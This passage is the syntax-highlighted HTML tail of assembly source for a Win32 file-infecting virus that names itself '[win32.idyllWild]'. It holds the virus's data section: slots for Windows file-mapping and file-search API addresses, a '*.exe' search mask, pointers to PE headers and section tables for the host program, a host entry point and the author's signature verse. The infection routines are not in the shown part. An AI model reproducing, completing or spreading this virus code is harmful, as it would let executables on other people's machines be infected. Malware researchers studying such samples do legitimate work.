</span><span class="sc5">idyll_createfilea_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;@15B7</span><span class="sc0">
</span><span class="sc5">idyll_createfilemappinga_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_mapviewoffile_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_unmapviewoffile_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_closehandle_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_virtualalloc_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_virtualfree_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_findfirstfilea_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_findnextfilea_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_setfileattributesa_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idyll_getlasterror_add</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">idyll_hostentry</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_start</span><span class="sc0">    </span><span class="sc1">;host erva @15E3</span><span class="sc0">
</span><span class="sc5">idyll_filemask</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;filemask for searches @15E7</span><span class="sc0">
</span><span class="sc5">idyll_findhandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@15ED  handle for file searches</span><span class="sc0">
</span><span class="sc5">idyll_finddata_add</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@15F1  address of finddata structure</span><span class="sc0">
</span><span class="sc5">idyll_handle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@15F5  handle of open file</span><span class="sc0">
</span><span class="sc5">idyll_maphand</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@15F9  handle of file mapping object</span><span class="sc0">
</span><span class="sc5">idyll_mappedadd</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@15FD  address of mapped file</span><span class="sc0">
</span><span class="sc5">idyll_peheader</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@1601  ptr to PE header</span><span class="sc0">
</span><span class="sc5">idyll_1stsec</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@1605  ptr to 1st entry in object table</span><span class="sc0">
</span><span class="sc5">idyll_sectsize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@1609</span><span class="sc0">
</span><span class="sc5">idyll_x</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;@160D</span><span class="sc0">
</span><span class="sc5">idyll_dllnamebuffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;@1611</span><span class="sc0">
</span><span class="sc5">idyll_text</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[win32.idyllWild]'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'take me in your arms of velvet...'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'kiss me with satin...'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'drown me.'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">

</span><span class="sc5">idyll_end</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">fixups</span><span class="sc0">  </span><span class="sc1">;we will start fixup routine first</span><span class="sc0">

</span></div></body>
</html>
